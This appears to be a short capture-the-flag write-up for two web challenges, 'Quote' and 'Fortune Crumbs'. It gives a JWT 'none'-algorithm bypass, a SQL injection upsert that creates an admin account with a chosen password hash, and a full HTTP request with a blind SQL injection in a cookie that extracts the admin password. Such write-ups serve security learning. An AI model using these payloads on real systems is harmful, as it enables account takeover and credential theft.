## Web - Quote
Solution 1: just registering a normal account then using jwt none algorithm 

Solution 2: from random player 
quote -> INSERT INTO User (username, password_hash, jwt_algorithm) VALUES ("ad"||"min", '$2b$12$9ZdLvg6oTpp.ekSXsBZMdeh2Ffg6genKCDN4QU4msDbrCgSdGVMeK', 'HS256') ON CONFLICT(username) DO UPDATE SET password_hash = '$2b$12$9ZdLvg6oTpp.ekSXsBZMdeh2Ffg6genKCDN4QU4msDbrCgSdGVMeK',    jwt_algorithm = 'none' -- -;

for summarize, they used concatenation to register a admin account with the password they control.

## Web - Fortune Crumbs
Solution:
```
GET /request HTTP/2
Host: fortune-crumbs.ctf.pearlctf.in
Cookie: auth_token=2123' OR (SUBSTRING((SELECT password FROM users WHERE username='admin'),position,1))='char'-- -
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://fortune-crumbs.ctf.pearlctf.in/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
If-None-Match: 
Priority: u=0
Te: trailers
```

